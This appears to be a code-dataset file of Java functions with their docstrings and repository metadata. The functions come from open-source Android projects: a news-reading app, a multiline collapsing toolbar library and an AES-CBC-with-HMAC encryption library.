{"docstring": "/**\n * destroy child fragments\n */\n", "func_signal": "@Override\npublic void onDetach()", "code": "{\n    super.onDetach();\n    if(getChildFragmentManager().getFragments()!=null){\n        getChildFragmentManager().getFragments().clear();\n    }\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\ui\\collection\\BaseCollectionFragment.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * Static Method to get news api address.\n * <p> Get news api address from file raw/news_api.txt , news api are writen\n * in XML format . <br>\n *\n * @return String [] news api address\n */\n", "func_signal": "public static String[] getNewsUrl()", "code": "{\n    // Check if it has already got the address before\n    // if true ,return it directly. Otherwise try to get it from file\n    if (newsUrl == null) {\n        if (document == null) {\n            // convert file to InputStream\n            InputStream is = Utils.readFileFromRaw(R.raw.news_api);\n            // convert document format from InputStream format\n            document = Utils.getDocmentByIS(is);\n        }\n        // Parsing required data from document.\n        NodeList urlList = document.getElementsByTagName(\"url\");\n        newsUrl = new String[urlList.getLength()];\n        for (int i = 0; i < urlList.getLength(); i++) {\n            newsUrl[i] = urlList.item(i).getTextContent();\n        }\n    }\n    return newsUrl;\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\api\\NewsApi.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * destroy child fragments\n */\n", "func_signal": "@Override\npublic void onDetach()", "code": "{\n    super.onDetach();\n    if(getChildFragmentManager().getFragments()!=null){\n        getChildFragmentManager().getFragments().clear();\n    }\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\ui\\reading\\BaseReadingFragment.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * Get book tags randomly\n *\n * @return tags\n */\n", "func_signal": "public static String[] getTags(String[] tag)", "code": "{\n    int len = tag.length;\n    String[] res = new String[TAG_LEN];\n    for (int i = 0; i < TAG_LEN; i++) {\n        boolean flag = true;\n        int tmp = 0;\n        while (flag) {\n            flag = false;\n            tmp = (int) (Math.random() * len);\n            for (int j = 0; j < i; j++) {\n                if (res[j].equals(tag[tmp])) {\n                    flag = true;\n                    break;\n                }\n            }\n        }\n        res[i] = tag[tmp];\n    }\n    return res;\n}", "path": "app\\src\\main\\java\\com\\mummyding\\app\\leisure\\api\\ReadingApi.java", "repo_name": "MummyDing/Leisure", "stars": 556, "license": "lgpl-3.0", "language": "java", "size": 26684}
{"docstring": "/**\n * Sets the ending expanded title margin in pixels.\n *\n * @param margin the ending title margin in pixels\n * @see #getExpandedTitleMarginEnd()\n * @attr ref android.support.design.R.styleable#CollapsingToolbarLayout_expandedTitleMarginEnd\n */\n", "func_signal": "public void setExpandedTitleMarginEnd(int margin)", "code": "{\n    mExpandedMarginEnd = margin;\n    requestLayout();\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Returns the amount of visible height in pixels used to define when to trigger a scrim\n * visibility change.\n *\n * @see #setScrimVisibleHeightTrigger(int)\n */\n", "func_signal": "public int getScrimVisibleHeightTrigger()", "code": "{\n    if (mScrimVisibleHeightTrigger >= 0) {\n        // If we have one explicitly set, return it\n        return mScrimVisibleHeightTrigger;\n    }\n\n    // Otherwise we'll use the default computed value\n    final int insetTop = mLastInsets != null ? mLastInsets.getSystemWindowInsetTop() : 0;\n\n    final int minHeight = ViewCompat.getMinimumHeight(this);\n    if (minHeight > 0) {\n        // If we have a minHeight set, lets use 2 * minHeight (capped at our height)\n        return Math.min((minHeight * 2) + insetTop, getHeight());\n    }\n\n    // If we reach here then we don't have a min height set. Instead we'll take a\n    // guess at 1/3 of our height being visible\n    return getHeight() / 3;\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Sets whether this view should display its own title.\n *\n * <p>The title displayed by this view will shrink and grow based on the scroll offset.</p>\n *\n * @see #setTitle(CharSequence)\n * @see #isTitleEnabled()\n *\n * @attr ref R.styleable#CollapsingToolbarLayout_titleEnabled\n */\n", "func_signal": "public void setTitleEnabled(boolean enabled)", "code": "{\n    if (enabled != mCollapsingTitleEnabled) {\n        mCollapsingTitleEnabled = enabled;\n        updateDummyView();\n        requestLayout();\n    }\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Set the drawable to use for the content scrim from resources. Providing null will disable\n * the scrim functionality.\n *\n * @param drawable the drawable to display\n *\n * @attr ref R.styleable#CollapsingToolbarLayout_contentScrim\n * @see #getContentScrim()\n */\n", "func_signal": "public void setContentScrim(@Nullable Drawable drawable)", "code": "{\n    if (mContentScrim != drawable) {\n        if (mContentScrim != null) {\n            mContentScrim.setCallback(null);\n        }\n        mContentScrim = drawable != null ? drawable.mutate() : null;\n        if (mContentScrim != null) {\n            mContentScrim.setBounds(0, 0, getWidth(), getHeight());\n            mContentScrim.setCallback(this);\n            mContentScrim.setAlpha(mScrimAlpha);\n        }\n        ViewCompat.postInvalidateOnAnimation(this);\n    }\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "// BEGIN MODIFICATION: new setCollapsedTextBlend and setExpandedTextBlend methods\n", "func_signal": "private void setCollapsedTextBlend(float blend)", "code": "{\n    mCollapsedTextBlend = blend;\n    ViewCompat.postInvalidateOnAnimation(mView);\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingTextHelper.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Set the drawable to use for the status bar scrim from resources.\n * Providing null will disable the scrim functionality.\n *\n * <p>This scrim is only shown when we have been given a top system inset.</p>\n *\n * @param drawable the drawable to display\n *\n * @attr ref R.styleable#CollapsingToolbarLayout_statusBarScrim\n * @see #getStatusBarScrim()\n */\n", "func_signal": "public void setStatusBarScrim(@Nullable Drawable drawable)", "code": "{\n    if (mStatusBarScrim != drawable) {\n        if (mStatusBarScrim != null) {\n            mStatusBarScrim.setCallback(null);\n        }\n        mStatusBarScrim = drawable != null ? drawable.mutate() : null;\n        if (mStatusBarScrim != null) {\n            if (mStatusBarScrim.isStateful()) {\n                mStatusBarScrim.setState(getDrawableState());\n            }\n            DrawableCompat.setLayoutDirection(mStatusBarScrim,\n                    ViewCompat.getLayoutDirection(this));\n            mStatusBarScrim.setVisible(getVisibility() == VISIBLE, false);\n            mStatusBarScrim.setCallback(this);\n            mStatusBarScrim.setAlpha(mScrimAlpha);\n        }\n        ViewCompat.postInvalidateOnAnimation(this);\n    }\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "// END MODIFICATION\n", "func_signal": "private Typeface readFontFamilyTypeface(int resId)", "code": "{\n    final TypedArray a = mView.getContext().obtainStyledAttributes(resId,\n            new int[]{android.R.attr.fontFamily});\n    try {\n        final String family = a.getString(0);\n        if (family != null) {\n            return Typeface.create(family, Typeface.NORMAL);\n        }\n    } finally {\n        a.recycle();\n    }\n    return null;\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingTextHelper.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Sets the bottom expanded title margin in pixels.\n *\n * @param margin the bottom title margin in pixels\n * @see #getExpandedTitleMarginBottom()\n * @attr ref android.support.design.R.styleable#CollapsingToolbarLayout_expandedTitleMarginBottom\n */\n", "func_signal": "public void setExpandedTitleMarginBottom(int margin)", "code": "{\n    mExpandedMarginBottom = margin;\n    requestLayout();\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "// BEGIN MODIFICATION: new ensureCollapsedTexture and ensureCrossSectionTexture methods\n", "func_signal": "private void ensureCollapsedTexture()", "code": "{\n    if (mCollapsedTitleTexture != null || mCollapsedBounds.isEmpty()\n            || TextUtils.isEmpty(mTextToDraw)) {\n        return;\n    }\n    calculateOffsets(0f);\n    final int w = Math.round(mTextPaint.measureText(mTextToDraw, 0, mTextToDraw.length()));\n    final int h = Math.round(mTextPaint.descent() - mTextPaint.ascent());\n    if (w <= 0 && h <= 0) {\n        return; // If the width or height are 0, return\n    }\n    mCollapsedTitleTexture = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);\n    Canvas c = new Canvas(mCollapsedTitleTexture);\n    c.drawText(mTextToDrawCollapsed, 0, mTextToDrawCollapsed.length(), 0,\n            -mTextPaint.ascent() / mScale, mTextPaint);\n    if (mTexturePaint == null) {\n        // Make sure we have a paint\n        mTexturePaint = new Paint(Paint.ANTI_ALIAS_FLAG | Paint.FILTER_BITMAP_FLAG);\n    }\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingTextHelper.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "// END MODIFICATION\n", "func_signal": "public CollapsingTextHelper(View view)", "code": "{\n    mView = view;\n\n    mTextPaint = new TextPaint(Paint.ANTI_ALIAS_FLAG | Paint.SUBPIXEL_TEXT_FLAG);\n\n    mCollapsedBounds = new Rect();\n    mExpandedBounds = new Rect();\n    mCurrentBounds = new RectF();\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingTextHelper.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Blend {@code color1} and {@code color2} using the given ratio.\n *\n * @param ratio of which to blend. 0.0 will return {@code color1}, 0.5 will give an even blend,\n *              1.0 will return {@code color2}.\n */\n", "func_signal": "private static int blendColors(int color1, int color2, float ratio)", "code": "{\n    final float inverseRatio = 1f - ratio;\n    float a = (Color.alpha(color1) * inverseRatio) + (Color.alpha(color2) * ratio);\n    float r = (Color.red(color1) * inverseRatio) + (Color.red(color2) * ratio);\n    float g = (Color.green(color1) * inverseRatio) + (Color.green(color2) * ratio);\n    float b = (Color.blue(color1) * inverseRatio) + (Color.blue(color2) * ratio);\n    return Color.argb((int) a, (int) r, (int) g, (int) b);\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingTextHelper.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Sets the expanded title margins.\n *\n * @param start the starting title margin in pixels\n * @param top the top title margin in pixels\n * @param end the ending title margin in pixels\n * @param bottom the bottom title margin in pixels\n *\n * @see #getExpandedTitleMarginStart()\n * @see #getExpandedTitleMarginTop()\n * @see #getExpandedTitleMarginEnd()\n * @see #getExpandedTitleMarginBottom()\n * @attr ref android.support.design.R.styleable#CollapsingToolbarLayout_expandedTitleMargin\n */\n", "func_signal": "public void setExpandedTitleMargin(int start, int top, int end, int bottom)", "code": "{\n    mExpandedMarginStart = start;\n    mExpandedMarginTop = top;\n    mExpandedMarginEnd = end;\n    mExpandedMarginBottom = bottom;\n    requestLayout();\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Sets the top expanded title margin in pixels.\n *\n * @param margin the top title margin in pixels\n * @see #getExpandedTitleMarginTop()\n * @attr ref android.support.design.R.styleable#CollapsingToolbarLayout_expandedTitleMarginTop\n */\n", "func_signal": "public void setExpandedTitleMarginTop(int margin)", "code": "{\n    mExpandedMarginTop = margin;\n    requestLayout();\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "// END MODIFICATION\n", "func_signal": "public void recalculate()", "code": "{\n    if (mView.getHeight() > 0 && mView.getWidth() > 0) {\n        // If we've already been laid out, calculate everything now otherwise we'll wait\n        // until a layout\n        calculateBaseOffsets();\n        calculateCurrentOffsets();\n    }\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingTextHelper.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Set the top and bottom offset for this {@link ViewOffsetHelper}'s view.\n *\n * @param offset the offset in px.\n * @return true if the offset has changed\n */\n", "func_signal": "public boolean setTopAndBottomOffset(int offset)", "code": "{\n    if (mOffsetTop != offset) {\n        mOffsetTop = offset;\n        updateOffsets();\n        return true;\n    }\n    return false;\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\ViewOffsetHelper.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Set the left and right offset for this {@link ViewOffsetHelper}'s view.\n *\n * @param offset the offset in px.\n * @return true if the offset has changed\n */\n", "func_signal": "public boolean setLeftAndRightOffset(int offset)", "code": "{\n    if (mOffsetLeft != offset) {\n        mOffsetLeft = offset;\n        updateOffsets();\n        return true;\n    }\n    return false;\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\ViewOffsetHelper.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Set whether the content scrim and/or status bar scrim should be shown or not. Any change\n * in the vertical scroll may overwrite this value.\n *\n * @param shown whether the scrims should be shown\n * @param animate whether to animate the visibility change\n *\n * @see #getStatusBarScrim()\n * @see #getContentScrim()\n */\n", "func_signal": "public void setScrimsShown(boolean shown, boolean animate)", "code": "{\n    if (mScrimsAreShown != shown) {\n        if (animate) {\n            animateScrim(shown ? 0xFF : 0x0);\n        } else {\n            setScrimAlpha(shown ? 0xFF : 0x0);\n        }\n        mScrimsAreShown = shown;\n    }\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Sets the starting expanded title margin in pixels.\n *\n * @param margin the starting title margin in pixels\n * @see #getExpandedTitleMarginStart()\n * @attr ref android.support.design.R.styleable#CollapsingToolbarLayout_expandedTitleMarginStart\n */\n", "func_signal": "public void setExpandedTitleMarginStart(int margin)", "code": "{\n    mExpandedMarginStart = margin;\n    requestLayout();\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * Returns the direct child of this layout, which itself is the ancestor of the\n * given view.\n */\n", "func_signal": "private View findDirectChild(final View descendant)", "code": "{\n    View directChild = descendant;\n    for (ViewParent p = descendant.getParent(); p != this && p != null; p = p.getParent()) {\n        if (p instanceof View) {\n            directChild = (View) p;\n        }\n    }\n    return directChild;\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "// END MODIFICATION\n", "func_signal": "@Override\nprotected void onAttachedToWindow()", "code": "{\n    super.onAttachedToWindow();\n\n    // Add an OnOffsetChangedListener if possible\n    final ViewParent parent = getParent();\n    if (parent instanceof AppBarLayout) {\n        // Copy over from the ABL whether we should fit system windows\n        ViewCompat.setFitsSystemWindows(this, ViewCompat.getFitsSystemWindows((View) parent));\n\n        if (mOnOffsetChangedListener == null) {\n            mOnOffsetChangedListener = new OffsetUpdateListener();\n        }\n        ((AppBarLayout) parent).addOnOffsetChangedListener(mOnOffsetChangedListener);\n\n        // We're attached, so lets request an inset dispatch\n        ViewCompat.requestApplyInsets(this);\n    }\n}", "path": "multiline-collapsingtoolbar\\src\\main\\java\\net\\opacapp\\multilinecollapsingtoolbar\\CollapsingToolbarLayout.java", "repo_name": "opacapp/multiline-collapsingtoolbar", "stars": 781, "license": "other", "language": "java", "size": 4547}
{"docstring": "/**\n * An aes key derived from a base64 encoded key. This does not generate the\n * key. It's not random or a PBE key.\n *\n * @param keysStr a base64 encoded AES key / hmac key as base64(aesKey) : base64(hmacKey).\n * @return an AES and HMAC key set suitable for other functions.\n */\n", "func_signal": "public static SecretKeys keys(String keysStr) throws InvalidKeyException", "code": "{\n    String[] keysArr = keysStr.split(\":\");\n\n    if (keysArr.length != 2) {\n        throw new IllegalArgumentException(\"Cannot parse aesKey:hmacKey\");\n\n    } else {\n        byte[] confidentialityKey = Base64.decode(keysArr[0], BASE64_FLAGS);\n        if (confidentialityKey.length != AES_KEY_LENGTH_BITS /8) {\n            throw new InvalidKeyException(\"Base64 decoded key is not \" + AES_KEY_LENGTH_BITS + \" bytes\");\n        }\n        byte[] integrityKey = Base64.decode(keysArr[1], BASE64_FLAGS);\n        if (integrityKey.length != HMAC_KEY_LENGTH_BITS /8) {\n            throw new InvalidKeyException(\"Base64 decoded key is not \" + HMAC_KEY_LENGTH_BITS + \" bytes\");\n        }\n\n        return new SecretKeys(\n                new SecretKeySpec(confidentialityKey, 0, confidentialityKey.length, CIPHER),\n                new SecretKeySpec(integrityKey, HMAC_ALGORITHM));\n    }\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Applies all fixes.\n *\n * @throws SecurityException if a fix is needed but could not be\n *             applied.\n */\n", "func_signal": "public static void apply()", "code": "{\n    applyOpenSSLFix();\n    installLinuxPRNGSecureRandom();\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Concatinate the IV to the cipherText using array copy.\n * This is used e.g. before computing mac.\n * @param iv The IV to prepend\n * @param cipherText the cipherText to append\n * @return iv:cipherText, a new byte array.\n */\n", "func_signal": "public static byte[] ivCipherConcat(byte[] iv, byte[] cipherText)", "code": "{\n    byte[] combined = new byte[iv.length + cipherText.length];\n    System.arraycopy(iv, 0, combined, 0, iv.length);\n    System.arraycopy(cipherText, 0, combined, iv.length, cipherText.length);\n    return combined;\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Generate the mac based on HMAC_ALGORITHM\n * @param integrityKey The key used for hmac\n * @param byteCipherText the cipher text\n * @return A byte array of the HMAC for the given key and ciphertext\n * @throws NoSuchAlgorithmException\n * @throws InvalidKeyException\n */\n", "func_signal": "public static byte[] generateMac(byte[] byteCipherText, SecretKey integrityKey) throws NoSuchAlgorithmException, InvalidKeyException", "code": "{\n    //Now compute the mac for later integrity checking\n    Mac sha256_HMAC = Mac.getInstance(HMAC_ALGORITHM);\n    sha256_HMAC.init(integrityKey);\n    return sha256_HMAC.doFinal(byteCipherText);\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Gets the hardware serial number of this device.\n *\n * @return serial number or {@code null} if not available.\n */\n", "func_signal": "private static String getDeviceSerialNumber()", "code": "{\n    // We're using the Reflection API because Build.SERIAL is only\n    // available since API Level 9 (Gingerbread, Android 2.3).\n    try {\n        return (String) Build.class.getField(\"SERIAL\").get(null);\n    } catch (Exception ignored) {\n        return null;\n    }\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Construct a new bundle of ciphertext and IV.\n * @param c The ciphertext\n * @param i The IV\n * @param h The mac\n */\n", "func_signal": "public CipherTextIvMac(byte[] c, byte[] i, byte[] h)", "code": "{\n    cipherText = new byte[c.length];\n    System.arraycopy(c, 0, cipherText, 0, c.length);\n    iv = new byte[i.length];\n    System.arraycopy(i, 0, iv, 0, i.length);\n    mac = new byte[h.length];\n    System.arraycopy(h, 0, mac, 0, h.length);\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * A function that generates password-based AES and HMAC keys. It prints out exceptions but\n * doesn't throw them since none should be encountered. If they are\n * encountered, the return value is null.\n *\n * @param password The password to derive the keys from.\n * @return The AES and HMAC keys.\n * @throws GeneralSecurityException if AES is not implemented on this system,\n *                                  or a suitable RNG is not available\n */\n", "func_signal": "public static SecretKeys generateKeyFromPassword(String password, byte[] salt) throws GeneralSecurityException", "code": "{\n    fixPrng();\n    //Get enough random bytes for both the AES key and the HMAC key:\n    KeySpec keySpec = new PBEKeySpec(password.toCharArray(), salt,\n            PBE_ITERATION_COUNT, AES_KEY_LENGTH_BITS + HMAC_KEY_LENGTH_BITS);\n    SecretKeyFactory keyFactory = SecretKeyFactory\n            .getInstance(PBE_ALGORITHM);\n    byte[] keyBytes = keyFactory.generateSecret(keySpec).getEncoded();\n\n    // Split the random bytes into two parts:\n    byte[] confidentialityKeyBytes = copyOfRange(keyBytes, 0, AES_KEY_LENGTH_BITS /8);\n    byte[] integrityKeyBytes = copyOfRange(keyBytes, AES_KEY_LENGTH_BITS /8, AES_KEY_LENGTH_BITS /8 + HMAC_KEY_LENGTH_BITS /8);\n\n    //Generate the AES key\n    SecretKey confidentialityKey = new SecretKeySpec(confidentialityKeyBytes, CIPHER);\n\n    //Generate the HMAC key\n    SecretKey integrityKey = new SecretKeySpec(integrityKeyBytes, HMAC_ALGORITHM);\n\n    return new SecretKeys(confidentialityKey, integrityKey);\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Simple constant-time equality of two byte arrays. Used for security to avoid timing attacks.\n * @param a\n * @param b\n * @return true iff the arrays are exactly equal.\n */\n", "func_signal": "public static boolean constantTimeEq(byte[] a, byte[] b)", "code": "{\n    if (a.length != b.length) {\n        return false;\n    }\n    int result = 0;\n    for (int i = 0; i < a.length; i++) {\n        result |= a[i] ^ b[i];\n    }\n    return result == 0;\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Applies the fix for OpenSSL PRNG having low entropy. Does nothing if\n * the fix is not needed.\n *\n * @throws SecurityException if the fix is needed but could not be\n *             applied.\n */\n", "func_signal": "private static void applyOpenSSLFix() throws SecurityException", "code": "{\n    if ((Build.VERSION.SDK_INT < VERSION_CODE_JELLY_BEAN)\n            || (Build.VERSION.SDK_INT > VERSION_CODE_JELLY_BEAN_MR2)) {\n        // No need to apply the fix\n        return;\n    }\n\n    try {\n        // Mix in the device- and invocation-specific seed.\n        Class.forName(\"org.apache.harmony.xnet.provider.jsse.NativeCrypto\")\n                .getMethod(\"RAND_seed\", byte[].class).invoke(null, generateSeed());\n\n        // Mix output of Linux PRNG into OpenSSL's PRNG\n        int bytesRead = (Integer) Class\n                .forName(\"org.apache.harmony.xnet.provider.jsse.NativeCrypto\")\n                .getMethod(\"RAND_load_file\", String.class, long.class)\n                .invoke(null, \"/dev/urandom\", 1024);\n        if (bytesRead != 1024) {\n            throw new IOException(\"Unexpected number of bytes read from Linux PRNG: \"\n                    + bytesRead);\n        }\n    } catch (Exception e) {\n        if (ALLOW_BROKEN_PRNG) {\n            Log.w(PrngFixes.class.getSimpleName(), \"Failed to seed OpenSSL PRNG\", e);\n        } else {\n            throw new SecurityException(\"Failed to seed OpenSSL PRNG\", e);\n        }\n    }\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Generates a random IV and encrypts this plain text with the given key. Then attaches\n * a hashed MAC, which is contained in the CipherTextIvMac class.\n *\n * @param plaintext The text that will be encrypted\n * @param secretKeys The combined AES and HMAC keys with which to encrypt\n * @return a tuple of the IV, ciphertext, mac\n * @throws GeneralSecurityException if AES is not implemented on this system\n */\n", "func_signal": "public static CipherTextIvMac encrypt(byte[] plaintext, SecretKeys secretKeys)\n        throws GeneralSecurityException", "code": "{\n    byte[] iv = generateIv();\n    Cipher aesCipherForEncryption = Cipher.getInstance(CIPHER_TRANSFORMATION);\n    aesCipherForEncryption.init(Cipher.ENCRYPT_MODE, secretKeys.getConfidentialityKey(), new IvParameterSpec(iv));\n\n    /*\n     * Now we get back the IV that will actually be used. Some Android\n     * versions do funny stuff w/ the IV, so this is to work around bugs:\n     */\n    iv = aesCipherForEncryption.getIV();\n    byte[] byteCipherText = aesCipherForEncryption.doFinal(plaintext);\n    byte[] ivCipherConcat = CipherTextIvMac.ivCipherConcat(iv, byteCipherText);\n\n    byte[] integrityMac = generateMac(ivCipherConcat, secretKeys.getIntegrityKey());\n    return new CipherTextIvMac(byteCipherText, iv, integrityMac);\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * AES CBC decrypt.\n *\n * @param civ the cipher text, iv, and mac\n * @param secretKeys the AES and HMAC keys\n * @return The raw decrypted bytes\n * @throws GeneralSecurityException if MACs don't match or AES is not implemented\n */\n", "func_signal": "public static byte[] decrypt(CipherTextIvMac civ, SecretKeys secretKeys)\n        throws GeneralSecurityException", "code": "{\n\n    byte[] ivCipherConcat = CipherTextIvMac.ivCipherConcat(civ.getIv(), civ.getCipherText());\n    byte[] computedMac = generateMac(ivCipherConcat, secretKeys.getIntegrityKey());\n    if (constantTimeEq(computedMac, civ.getMac())) {\n        Cipher aesCipherForDecryption = Cipher.getInstance(CIPHER_TRANSFORMATION);\n        aesCipherForDecryption.init(Cipher.DECRYPT_MODE, secretKeys.getConfidentialityKey(),\n                new IvParameterSpec(civ.getIv()));\n        return aesCipherForDecryption.doFinal(civ.getCipherText());\n    } else {\n        throw new GeneralSecurityException(\"MAC stored in civ does not match computed MAC.\");\n    }\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
{"docstring": "/**\n * Ensures that the PRNG is fixed. Should be used before generating any keys.\n * Will only run once, and every subsequent call should return immediately.\n */\n", "func_signal": "private static void fixPrng()", "code": "{\n    if (!prngFixed.get()) {\n        synchronized (PrngFixes.class) {\n            if (!prngFixed.get()) {\n                PrngFixes.apply();\n                prngFixed.set(true);\n            }\n        }\n    }\n}", "path": "aes-crypto\\src\\main\\java\\com\\tozny\\crypto\\android\\AesCbcWithIntegrity.java", "repo_name": "tozny/java-aes-crypto", "stars": 735, "license": "mit", "language": "java", "size": 233}
